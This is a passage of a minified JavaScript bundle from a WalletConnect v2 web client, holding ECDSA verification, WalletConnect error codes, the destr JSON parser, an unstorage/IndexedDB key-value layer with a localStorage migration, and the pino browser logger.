n_(N.hash.outputLen,N.nByteLength,N.hmac)(U,M)}u.BASE._setWindowSize(8);function ne(j,A,C,U=W){var Re;const M=j;A=Yn("msgHash",A),C=Yn("publicKey",C);const{lowS:N,prehash:V,format:F}=U;if(Tb(U),"strict"in U)throw new Error("options.strict was renamed to lowS");if(F!==void 0&&F!=="compact"&&F!=="der")throw new Error("format must be compact or der");const q=typeof M=="string"||ro(M),Q=!q&&!F&&typeof M=="object"&&M!==null&&typeof M.r=="bigint"&&typeof M.s=="bigint";if(!q&&!Q)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let te,se;try{if(Q&&(te=new m(M.r,M.s)),q){try{F!=="compact"&&(te=m.fromDER(M))}catch(Ue){if(!(Ue instanceof Si.Err))throw Ue}!te&&F!=="der"&&(te=m.fromCompact(M))}se=u.fromHex(C)}catch{return!1}if(!te||N&&te.hasHighS())return!1;V&&(A=e.hash(A));const{r:le,s:pe}=te,he=T(A),fe=c(pe),xe=l(he*fe),Oe=l(le*fe),Pe=(Re=u.BASE.multiplyAndAddUnsafe(se,xe,Oe))==null?void 0:Re.toAffine();return Pe?l(Pe.x)===le:!1}return{CURVE:e,getPublicKey:S,getSharedSecret:$,sign:J,verify:ne,ProjectivePoint:u,Signature:m,utils:x}}function sk(t){return{hash:t,hmac:(e,...n)=>e_(t,e,BD(...n)),randomBytes:VS}}function ok(t,e){const n=r=>ik({...t,...sk(r)});return{...n(e),create:n}}const h_=s_(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff")),ak=h_.create(BigInt("-3")),lk=BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b");ok({a:ak,b:lk,Fp:h_,n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),h:BigInt(1),lowS:!1},xN);const ck={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}};function uk(t,e){const{message:n,code:r}=ck[t];return{message:n,code:r}}function Cy(t,e){return!!Array.isArray(t)}class ho{}let hk=class extends ho{constructor(e){super()}};const Cb=be.FIVE_SECONDS,fo={pulse:"heartbeat_pulse"};let fk=class f_ extends hk{constructor(e){super(e),this.events=new rr.EventEmitter,this.interval=Cb,this.interval=(e==null?void 0:e.interval)||Cb}static async init(e){const n=new f_(e);return await n.init(),n}async init(){await this.initialize()}stop(){clearInterval(this.intervalRef)}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async initialize(){this.intervalRef=setInterval(()=>this.pulse(),be.toMiliseconds(this.interval))}pulse(){this.events.emit(fo.pulse)}};const dk=/"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,pk=/"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,gk=/^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;function yk(t,e){if(t==="__proto__"||t==="constructor"&&e&&typeof e=="object"&&"prototype"in e){mk(t);return}return e}function mk(t){console.warn(`[destr] Dropping "${t}" key to prevent prototype pollution.`)}function bh(t,e={}){if(typeof t!="string")return t;if(t[0]==='"'&&t[t.length-1]==='"'&&t.indexOf("\\")===-1)return t.slice(1,-1);const n=t.trim();if(n.length<=9)switch(n.toLowerCase()){case"true":return!0;case"false":return!1;case"undefined":return;case"null":return null;case"nan":return Number.NaN;case"infinity":return Number.POSITIVE_INFINITY;case"-infinity":return Number.NEGATIVE_INFINITY}if(!gk.test(t)){if(e.strict)throw new SyntaxError("[destr] Invalid JSON");return t}try{if(dk.test(t)||pk.test(t)){if(e.strict)throw new Error("[destr] Possible prototype pollution");return JSON.parse(t,yk)}return JSON.parse(t)}catch(r){if(e.strict)throw r;return t}}function wk(t){return!t||typeof t.then!="function"?Promise.resolve(t):t}function zt(t,...e){try{return wk(t(...e))}catch(n){return Promise.reject(n)}}function vk(t){const e=typeof t;return t===null||e!=="object"&&e!=="function"}function bk(t){const e=Object.getPrototypeOf(t);return!e||e.isPrototypeOf(Object)}function Mh(t){if(vk(t))return String(t);if(bk(t)||Array.isArray(t))return JSON.stringify(t);if(typeof t.toJSON=="function")return Mh(t.toJSON());throw new Error("[unstorage] Cannot stringify value!")}const Ry="base64:";function Ek(t){return typeof t=="string"?t:Ry+_k(t)}function xk(t){return typeof t!="string"||!t.startsWith(Ry)?t:Sk(t.slice(Ry.length))}function Sk(t){return globalThis.Buffer?Buffer.from(t,"base64"):Uint8Array.from(globalThis.atob(t),e=>e.codePointAt(0))}function _k(t){return globalThis.Buffer?Buffer.from(t).toString("base64"):globalThis.btoa(String.fromCodePoint(...t))}function Dn(t){var e;return t&&((e=t.split("?")[0])==null?void 0:e.replace(/[/\\]/g,":").replace(/:+/g,":").replace(/^:|:$/g,""))||""}function Ik(...t){return Dn(t.join(":"))}function Eh(t){return t=Dn(t),t?t+":":""}function Ok(t,e){if(e===void 0)return!0;let n=0,r=t.indexOf(":");for(;r>-1;)n++,r=t.indexOf(":",r+1);return n<=e}function $k(t,e){return e?t.startsWith(e)&&t[t.length-1]!=="$":t[t.length-1]!=="$"}const Pk="memory",Tk=()=>{const t=new Map;return{name:Pk,getInstance:()=>t,hasItem(e){return t.has(e)},getItem(e){return t.get(e)??null},getItemRaw(e){return t.get(e)??null},setItem(e,n){t.set(e,n)},setItemRaw(e,n){t.set(e,n)},removeItem(e){t.delete(e)},getKeys(){return[...t.keys()]},clear(){t.clear()},dispose(){t.clear()}}};function Ak(t={}){const e={mounts:{"":t.driver||Tk()},mountpoints:[""],watching:!1,watchListeners:[],unwatch:{}},n=f=>{for(const d of e.mountpoints)if(f.startsWith(d))return{base:d,relativeKey:f.slice(d.length),driver:e.mounts[d]};return{base:"",relativeKey:f,driver:e.mounts[""]}},r=(f,d)=>e.mountpoints.filter(y=>y.startsWith(f)||d&&f.startsWith(y)).map(y=>({relativeBase:f.length>y.length?f.slice(y.length):void 0,mountpoint:y,driver:e.mounts[y]})),i=(f,d)=>{if(e.watching){d=Dn(d);for(const y of e.watchListeners)y(f,d)}},o=async()=>{if(!e.watching){e.watching=!0;for(const f in e.mounts)e.unwatch[f]=await Rb(e.mounts[f],i,f)}},l=async()=>{if(e.watching){for(const f in e.unwatch)await e.unwatch[f]();e.unwatch={},e.watching=!1}},c=(f,d,y)=>{const g=new Map,E=w=>{let b=g.get(w.base);return b||(b={driver:w.driver,base:w.base,items:[]},g.set(w.base,b)),b};for(const w of f){const b=typeof w=="string",m=Dn(b?w:w.key),x=b?void 0:w.value,S=b||!w.options?d:{...d,...w.options},O=n(m);E(O).items.push({key:m,value:x,relativeKey:O.relativeKey,options:S})}return Promise.all([...g.values()].map(w=>y(w))).then(w=>w.flat())},u={hasItem(f,d={}){f=Dn(f);const{relativeKey:y,driver:g}=n(f);return zt(g.hasItem,y,d)},getItem(f,d={}){f=Dn(f);const{relativeKey:y,driver:g}=n(f);return zt(g.getItem,y,d).then(E=>bh(E))},getItems(f,d={}){return c(f,d,y=>y.driver.getItems?zt(y.driver.getItems,y.items.map(g=>({key:g.relativeKey,options:g.options})),d).then(g=>g.map(E=>({key:Ik(y.base,E.key),value:bh(E.value)}))):Promise.all(y.items.map(g=>zt(y.driver.getItem,g.relativeKey,g.options).then(E=>({key:g.key,value:bh(E)})))))},getItemRaw(f,d={}){f=Dn(f);const{relativeKey:y,driver:g}=n(f);return g.getItemRaw?zt(g.getItemRaw,y,d):zt(g.getItem,y,d).then(E=>xk(E))},async setItem(f,d,y={}){if(d===void 0)return u.removeItem(f);f=Dn(f);const{relativeKey:g,driver:E}=n(f);E.setItem&&(await zt(E.setItem,g,Mh(d),y),E.watch||i("update",f))},async setItems(f,d){await c(f,d,async y=>{if(y.driver.setItems)return zt(y.driver.setItems,y.items.map(g=>({key:g.relativeKey,value:Mh(g.value),options:g.options})),d);y.driver.setItem&&await Promise.all(y.items.map(g=>zt(y.driver.setItem,g.relativeKey,Mh(g.value),g.options)))})},async setItemRaw(f,d,y={}){if(d===void 0)return u.removeItem(f,y);f=Dn(f);const{relativeKey:g,driver:E}=n(f);if(E.setItemRaw)await zt(E.setItemRaw,g,d,y);else if(E.setItem)await zt(E.setItem,g,Ek(d),y);else return;E.watch||i("update",f)},async removeItem(f,d={}){typeof d=="boolean"&&(d={removeMeta:d}),f=Dn(f);const{relativeKey:y,driver:g}=n(f);g.removeItem&&(await zt(g.removeItem,y,d),(d.removeMeta||d.removeMata)&&await zt(g.removeItem,y+"$",d),g.watch||i("remove",f))},async getMeta(f,d={}){typeof d=="boolean"&&(d={nativeOnly:d}),f=Dn(f);const{relativeKey:y,driver:g}=n(f),E=Object.create(null);if(g.getMeta&&Object.assign(E,await zt(g.getMeta,y,d)),!d.nativeOnly){const w=await zt(g.getItem,y+"$",d).then(b=>bh(b));w&&typeof w=="object"&&(typeof w.atime=="string"&&(w.atime=new Date(w.atime)),typeof w.mtime=="string"&&(w.mtime=new Date(w.mtime)),Object.assign(E,w))}return E},setMeta(f,d,y={}){return this.setItem(f+"$",d,y)},removeMeta(f,d={}){return this.removeItem(f+"$",d)},async getKeys(f,d={}){var m;f=Eh(f);const y=r(f,!0);let g=[];const E=[];let w=!0;for(const x of y){(m=x.driver.flags)!=null&&m.maxDepth||(w=!1);const S=await zt(x.driver.getKeys,x.relativeBase,d);for(const O of S){const $=x.mountpoint+Dn(O);g.some(R=>$.startsWith(R))||E.push($)}g=[x.mountpoint,...g.filter(O=>!O.startsWith(x.mountpoint))]}const b=d.maxDepth!==void 0&&!w;return E.filter(x=>(!b||Ok(x,d.maxDepth))&&$k(x,f))},async clear(f,d={}){f=Eh(f),await Promise.all(r(f,!1).map(async y=>{if(y.driver.clear)return zt(y.driver.clear,y.relativeBase,d);if(y.driver.removeItem){const g=await y.driver.getKeys(y.relativeBase||"",d);return Promise.all(g.map(E=>y.driver.removeItem(E,d)))}}))},async dispose(){await Promise.all(Object.values(e.mounts).map(f=>Db(f)))},async watch(f){return await o(),e.watchListeners.push(f),async()=>{e.watchListeners=e.watchListeners.filter(d=>d!==f),e.watchListeners.length===0&&await l()}},async unwatch(){e.watchListeners=[],await l()},mount(f,d){if(f=Eh(f),f&&e.mounts[f])throw new Error(`already mounted at ${f}`);return f&&(e.mountpoints.push(f),e.mountpoints.sort((y,g)=>g.length-y.length)),e.mounts[f]=d,e.watching&&Promise.resolve(Rb(d,i,f)).then(y=>{e.unwatch[f]=y}).catch(console.error),u},async unmount(f,d=!0){var y,g;f=Eh(f),!(!f||!e.mounts[f])&&(e.watching&&f in e.unwatch&&((g=(y=e.unwatch)[f])==null||g.call(y),delete e.unwatch[f]),d&&await Db(e.mounts[f]),e.mountpoints=e.mountpoints.filter(E=>E!==f),delete e.mounts[f])},getMount(f=""){f=Dn(f)+":";const d=n(f);return{driver:d.driver,base:d.base}},getMounts(f="",d={}){return f=Dn(f),r(f,d.parents).map(g=>({driver:g.driver,base:g.mountpoint}))},keys:(f,d={})=>u.getKeys(f,d),get:(f,d={})=>u.getItem(f,d),set:(f,d,y={})=>u.setItem(f,d,y),has:(f,d={})=>u.hasItem(f,d),del:(f,d={})=>u.removeItem(f,d),remove:(f,d={})=>u.removeItem(f,d)};return u}function Rb(t,e,n){return t.watch?t.watch((r,i)=>e(r,n+i)):()=>{}}async function Db(t){typeof t.dispose=="function"&&await zt(t.dispose)}function po(t){return new Promise((e,n)=>{t.oncomplete=t.onsuccess=()=>e(t.result),t.onabort=t.onerror=()=>n(t.error)})}function d_(t,e){let n;const r=()=>{if(n)return n;const i=indexedDB.open(t);return i.onupgradeneeded=()=>i.result.createObjectStore(e),n=po(i),n.then(o=>{o.onclose=()=>n=void 0},()=>{}),n};return(i,o)=>r().then(l=>o(l.transaction(e,i).objectStore(e)))}let xg;function jc(){return xg||(xg=d_("keyval-store","keyval")),xg}function Nb(t,e=jc()){return e("readonly",n=>po(n.get(t)))}function Ck(t,e,n=jc()){return n("readwrite",r=>(r.put(e,t),po(r.transaction)))}function Rk(t,e=jc()){return e("readwrite",n=>(n.delete(t),po(n.transaction)))}function Dk(t=jc()){return t("readwrite",e=>(e.clear(),po(e.transaction)))}function Nk(t,e){return t.openCursor().onsuccess=function(){this.result&&(e(this.result),this.result.continue())},po(t.transaction)}function kk(t=jc()){return t("readonly",e=>{if(e.getAllKeys)return po(e.getAllKeys());const n=[];return Nk(e,r=>n.push(r.key)).then(()=>n)})}const Bk=t=>JSON.stringify(t,(e,n)=>typeof n=="bigint"?n.toString()+"n":n),Lk=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,n=t.replace(e,'$1"$2n"$3');return JSON.parse(n,(r,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function tf(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return Lk(t)}catch{return t}}function Zm(t){return typeof t=="string"?t:Bk(t)||""}const jk="idb-keyval";var Uk=(t={})=>{const e=t.base&&t.base.length>0?`${t.base}:`:"",n=i=>e+i;let r;return t.dbName&&t.storeName&&(r=d_(t.dbName,t.storeName)),{name:jk,options:t,async hasItem(i){return!(typeof await Nb(n(i),r)>"u")},async getItem(i){return await Nb(n(i),r)??null},setItem(i,o){return Ck(n(i),o,r)},removeItem(i){return Rk(n(i),r)},getKeys(){return kk(r)},clear(){return Dk(r)}}};const Mk="WALLET_CONNECT_V2_INDEXED_DB",Fk="keyvaluestorage";let zk=class{constructor(){this.indexedDb=Ak({driver:Uk({dbName:Mk,storeName:Fk})})}async getKeys(){return this.indexedDb.getKeys()}async getEntries(){return(await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(e=>[e.key,e.value])}async getItem(e){const n=await this.indexedDb.getItem(e);if(n!==null)return n}async setItem(e,n){await this.indexedDb.setItem(e,Zm(n))}async removeItem(e){await this.indexedDb.removeItem(e)}};var Sg=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof globalThis<"u"?globalThis:typeof self<"u"?self:{},Fh={exports:{}};(function(){let t;function e(){}t=e,t.prototype.getItem=function(n){return this.hasOwnProperty(n)?String(this[n]):null},t.prototype.setItem=function(n,r){this[n]=String(r)},t.prototype.removeItem=function(n){delete this[n]},t.prototype.clear=function(){const n=this;Object.keys(n).forEach(function(r){n[r]=void 0,delete n[r]})},t.prototype.key=function(n){return n=n||0,Object.keys(this)[n]},t.prototype.__defineGetter__("length",function(){return Object.keys(this).length}),typeof Sg<"u"&&Sg.localStorage?Fh.exports=Sg.localStorage:typeof window<"u"&&window.localStorage?Fh.exports=window.localStorage:Fh.exports=new e})();function qk(t){var e;return[t[0],tf((e=t[1])!=null?e:"")]}let Hk=class{constructor(){this.localStorage=Fh.exports}async getKeys(){return Object.keys(this.localStorage)}async getEntries(){return Object.entries(this.localStorage).map(qk)}async getItem(e){const n=this.localStorage.getItem(e);if(n!==null)return tf(n)}async setItem(e,n){this.localStorage.setItem(e,Zm(n))}async removeItem(e){this.localStorage.removeItem(e)}};const Vk="wc_storage_version",kb=1,Wk=async(t,e,n)=>{const r=Vk,i=await e.getItem(r);if(i&&i>=kb){n(e);return}const o=await t.getKeys();if(!o.length){n(e);return}const l=[];for(;o.length;){const c=o.shift();if(!c)continue;const u=c.toLowerCase();if(u.includes("wc@")||u.includes("walletconnect")||u.includes("wc_")||u.includes("wallet_connect")){const f=await t.getItem(c);await e.setItem(c,f),l.push(c)}}await e.setItem(r,kb),n(e),Kk(t,l)},Kk=async(t,e)=>{e.length&&e.forEach(async n=>{await t.removeItem(n)})};let Gk=class{constructor(){this.initialized=!1,this.setInitialized=n=>{this.storage=n,this.initialized=!0};const e=new Hk;this.storage=e;try{const n=new zk;Wk(e,n,this.setInitialized)}catch{this.initialized=!0}}async getKeys(){return await this.initialize(),this.storage.getKeys()}async getEntries(){return await this.initialize(),this.storage.getEntries()}async getItem(e){return await this.initialize(),this.storage.getItem(e)}async setItem(e,n){return await this.initialize(),this.storage.setItem(e,n)}async removeItem(e){return await this.initialize(),this.storage.removeItem(e)}async initialize(){this.initialized||await new Promise(e=>{const n=setInterval(()=>{this.initialized&&(clearInterval(n),e())},20)})}};var _g,Bb;function Yk(){if(Bb)return _g;Bb=1;function t(n){try{return JSON.stringify(n)}catch{return'"[Circular]"'}}_g=e;function e(n,r,i){var o=i&&i.stringify||t,l=1;if(typeof n=="object"&&n!==null){var c=r.length+l;if(c===1)return n;var u=new Array(c);u[0]=o(n);for(var f=1;f<c;f++)u[f]=o(r[f]);return u.join(" ")}if(typeof n!="string")return n;var d=r.length;if(d===0)return n;for(var y="",g=1-l,E=-1,w=n&&n.length||0,b=0;b<w;){if(n.charCodeAt(b)===37&&b+1<w){switch(E=E>-1?E:0,n.charCodeAt(b+1)){case 100:case 102:if(g>=d||r[g]==null)break;E<b&&(y+=n.slice(E,b)),y+=Number(r[g]),E=b+2,b++;break;case 105:if(g>=d||r[g]==null)break;E<b&&(y+=n.slice(E,b)),y+=Math.floor(Number(r[g])),E=b+2,b++;break;case 79:case 111:case 106:if(g>=d||r[g]===void 0)break;E<b&&(y+=n.slice(E,b));var m=typeof r[g];if(m==="string"){y+="'"+r[g]+"'",E=b+2,b++;break}if(m==="function"){y+=r[g].name||"<anonymous>",E=b+2,b++;break}y+=o(r[g]),E=b+2,b++;break;case 115:if(g>=d)break;E<b&&(y+=n.slice(E,b)),y+=String(r[g]),E=b+2,b++;break;case 37:E<b&&(y+=n.slice(E,b)),y+="%",E=b+2,b++,g--;break}++g}++b}return E===-1?n:(E<w&&(y+=n.slice(E)),y)}return _g}var Ig,Lb;function Jk(){if(Lb)return Ig;Lb=1;const t=Yk();Ig=i;const e=R().console||{},n={mapHttpRequest:w,mapHttpResponse:w,wrapRequestSerializer:b,wrapResponseSerializer:b,wrapErrorSerializer:b,req:w,res:w,err:g};function r(T,D){return Array.isArray(T)?T.filter(function(k){return k!=="!stdSerializers.err"}):T===!0?Object.keys(D):!1}function i(T){T=T||{},T.browser=T.browser||{};const D=T.browser.transmit;if(D&&typeof D.send!="function")throw Error("pino: transmit option must have a send function");const B=T.browser.write||e;T.browser.write&&(T.browser.asObject=!0);const k=T.serializers||{},G=r(T.browser.serialize,k);let W=T.browser.serialize;Array.isArray(T.browser.serialize)&&T.browser.serialize.indexOf("!stdSerializers.err")>-1&&(W=!1);const J=["error","fatal","warn","info","debug","trace"];typeof B=="function"&&(B.error=B.fatal=B.warn=B.info=B.debug=B.trace=B),T.enabled===!1&&(T.level="silent");const ne=T.level||"info",j=Object.create(B);j.log||(j.log=m),Object.defineProperty(j,"levelVal",{get:C}),Object.defineProperty(j,"level",{get:U,set:M});const A={transmit:D,serialize:G,asObject:T.browser.asObject,levels:J,timestamp:E(T)};j.levels=i.levels,j.level=ne,j.setMaxListeners=j.getMaxListeners=j.emit=j.addListener=j.on=j.prependListener=j.once=j.prependOnceListener=j.removeListener=j.removeAllListeners=j.listeners=j.listenerCount=j.eventNames=j.write=j.flush=m,j.serializers=k,j._serialize=G,j._stdErrSerialize=W,j.child=N,D&&(j._logEvent=y());function C(){return this.level==="silent"?1/0:this.levels.values[this.level]}function U(){return this._level}function M(V){if(V!=="silent"&&!this.levels.values[V])throw Error("unknown level "+V);this._level=V,o(A,j,"error","log"),o(A,j,"fatal","error"),o(A,j,"warn","error"),o(A,j,"info","log"),o(A,j,"debug","log"),o(A,j,"trace","log")}function N(V,F){if(!V)throw new Error("missing bindings for child Pino");F=F||{},G&&V.serializers&&(F.serializers=V.serializers);const q=F.serializers;if(G&&q){var Q=Object.assign({},k,q),te=T.browser.serialize===!0?Object.keys(Q):G;delete V.serializers,u([V],te,Q,this._stdErrSerialize)}function se(le){this._childLevel=(le._childLevel|0)+1,this.error=f(le,V,"error"),this.fatal=f(le,V,"fatal"),this.warn=f(le,V,"warn"),this.info=f(le,V,"info"),this.debug=f(le,V,"debug"),this.trace=f(le,V,"trace"),Q&&(this.serializers=Q,this._serialize=te),D&&(this._logEvent=y([].concat(le._logEvent.bindings,V)))}return se.prototype=this,new se(this)}return j}i.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},i.stdSerializers=n,i.stdTimeFunctions=Object.assign({},{nullTime:x,epochTime:S,unixTime:O,isoTime:$});function o(T,D,B,k){const G=Object.getPrototypeOf(D);D[B]=D.levelVal>D.levels.values[B]?m:G[B]?G[B]:e[B]||e[k]||m,l(T,D,B)}function l(T,D,B){!T.transmit&&D[B]===m||(D[B]=function(k){return function(){const W=T.timestamp(),J=new Array(arguments.length),ne=Object.getPrototypeOf&&Object.getPrototypeOf(this)===e?e:this;for(var j=0;j<J.length;j++)J[j]=arguments[j];if(T.serialize&&!T.asObject&&u(J,this._serialize,this.serializers,this._stdErrSerialize),T.asObject?k.call(ne,c(this,B,J,W)):k.apply(ne,J),T.transmit){const A=T.transmit.level||D.level,C=i.levels.values[A],U=i.levels.values[B];if(U<C)return;d(this,{ts:W,methodLevel:B,methodValue:U,transmitValue:i.levels.values[T.transmit.level||D.level],send:T.transmit.send,val:D.levelVal},J)}}}(D[B]))}function c(T,D,B,k){T._serialize&&u(B,T._serialize,T.serializers,T._stdErrSerialize);const G=B.slice();let W=G[0];const J={};k&&(J.time=k),J.level=i.levels.values[D];let ne=(T._childLevel|0)+1;if(ne<1&&(ne=1),W!==null&&typeof W=="object"){for(;ne--&&typeof G[0]=="object";)Object.assign(J,G.shift());W=G.length?t(G.shift(),G):void 0}else typeof W=="string"&&(W=t(G.shift(),G));return W!==void 0&&(J.msg=W),J}function u(T,D,B,k){for(const G in T)if(k&&T[G]instanceof Error)T[G]=i.stdSerializers.err(T[G]);else if(typeof T[G]=="object"&&!Array.isArray(T[G]))for(const W in T[G])D&&D.indexOf(W)>-1&&W in B&&(T[G][W]=B[W](T[G][W]))}function f(T,D,B){return function(){const k=new Array(1+arguments.length);k[0]=D;for(var G=1;G<k.length;G++)k[G]=arguments[G-1];return T[B].apply(this,k)}}function d(T,D,B){const k=D.send,G=D.ts,W=D.methodLevel,J=D.methodValue,ne=D.val,j=T._logEvent.bindings;u(B,T._serialize||Object.keys(T.serializers),T.serializers,T._stdErrSerialize===void 0?!0:T._stdErrSerialize),T._logEvent.ts=G,T._logEvent.messages=B.filter(function(A){return j.indexOf(A)===-1}),T._logEvent.level.label=W,T._logEvent.level.value=J,k(W,T._logEvent,ne),T._logEvent=y(j)}function y(T){return{ts:0,messages:[],bindings:T||[],level:{label:"",value:0}}}function g(T){const D={type:T.constructor.name,msg:T.message,stack:T.stack};for(const B in T)D[B]===void 0&&(D[B]=T[B]);return D}function E(T){return typeof T.timestamp=="function"?T.timestamp:T.timestamp===!1?x:S}function w(){return{}}function b(T){return T}function m(){}function x(){return!1}function S(){return Date.now()}function O(){return Math.round(Date.now()/1e3)}function $(){return new Date(Date.now()).toISOString()}function R(){function T(D){return typeof D<"u"&&D}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return T(self)||T(window)||T(this)||{}}}return Ig}var pa=Jk();const Uc=yf(pa),Zk=t=>JSON.stringify(t,(e,n)=>typeof n=="bigint"?n.toString()+"n":n);function jb(t){return typeof t=="string"?t:Zk(t)||""}const Qk={level:"info"},Mc="custom_context",Qm=1e3*1024;let Xk=class{constructor(e){this.nodeValue=e,this.sizeInBytes=new TextEncoder().encode(this.nodeValue).length,this.next=null}get value(){return this.nodeValue}get size(){return this.sizeInBytes}},Ub=class{constructor(e){this.head=null,this.tail=null,this.lengthInNodes=0,this.maxSizeInBytes=e,this.sizeInBytes=0}append(e){const n=new Xk(e);if(n.size>this.maxSizeInBytes)throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${n.size}`);for(;this.size+n.size>this.maxSizeInBytes;)this.shift();this.head?(this.tail&&(this.tail.next=n),this.tail=n):(this.head=n,this.tail=n),this.lengthInNodes++,this.sizeInBytes+=n.size}shift(){if(!this.head)return;const e=this.head;this.head=this.head.next,this.head||(this.tail=null),this.lengthInNodes--,this.sizeInBytes-=e.size}toArray(){const e=[];let n=this.head;for(;n!==null;)e.push(n.value),n=n.next;return e}get length(){return this.lengthInNodes}get size(){return this.sizeInBytes}toOrderedArray(){return Array.from(this)}[Symbol.iterator](){let e=this.head;return{next:()=>{if(!e)return{done:!0,value:null};const n=e.value;return e=e.next,{done:!1,value:n}}}}},p_=class{constructor(e,n=Qm){this.level=e??"error",this.levelValue=pa.levels.values[this.level],this.MAX_LOG_SIZE_IN_BYTES=n,this.logs=new Ub(this.MAX_LOG_SIZE_IN_BYTES)}forwardToConsole(e,n){n===pa.levels.values.error?console.error(e):n===pa.levels.values.warn?console.warn(e):n===pa.levels.values.debug?console.debug(e):n===pa.levels.values.trace?console.trace(e):console.log(e)}appendToLogs(e){this.logs.append(jb({timestamp:new Date().toISOString(),log:e}));const n=typeof e=="string"?JSON.parse(e).level:e.level;n>=this.levelValue&&this.forwardToConsole(e,n)}getLogs(){return this.logs}clearLogs(){this.logs=new Ub(this.MAX_LOG_SIZE_IN_BYTES)}getLogArray(){return Array.from(this.logs)}logsToBlob(e){const n=this.getLogArray();return n.push(jb({extraMetadata:e})),new Blob(n,{type:"application/json"})}},e4=class{constructor(e,n=Qm){this.baseChunkLogger=new p_(e,n)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}downloadLogsBlobInBrowser(e){const n=URL.createObjectURL(this.logsToBlob(e)),r=document.createElement("a");r.href=n,r.download=`walletconnect-logs-${new Date().toISOString()}.txt`,document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(n)}},t4=class{constructor(e,n=Qm){this.baseChunkLogger=new p_(e,n)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}};var n4=Object.defineProperty,r4=Object.defineProperties,i4=Object.getOwnPropertyDescriptors,Mb=Object.getOwnPropertySymbols,s4=Object.prototype.hasOwnProperty,o4=Object.prototype.propertyIsEnumerable,Fb=(t,e,n)=>e in t?n4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,nf=(t,e)=>{for(var n in e||(e={}))s4.call(e,n)&&Fb(t,n,e[n]);if(Mb)for(var n of Mb(e))o4.call(e,n)&&Fb(t,n,e[n]);return t},rf=(t,e)=>r4(t,i4(e));function Af(t){return rf(nf({},t),{level:(t==null?void 0:t.level)||Qk.level})}function a4(t,e=Mc){return t[e]||""}function l4(t,e,n=Mc){return t[n]=e,t}function Fn(t,e=Mc){let n="";return typeof t.bindings>"u"?n=a4(t,e):n=t.bindings().context||"",n}function c4(t,e,n=Mc){const r=Fn(t,n);return r.trim()?`${r}/${e}`:e}function Sn(t,e,n=Mc){const r=c4(t,e,n),i=t.child({context:r});return l4(i,r,n)}function u4(t){var e,n;const r=new e4((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Uc(rf(nf({},t.opts),{level:"trace",browser:rf(nf({},(n=t.opts)==null?void 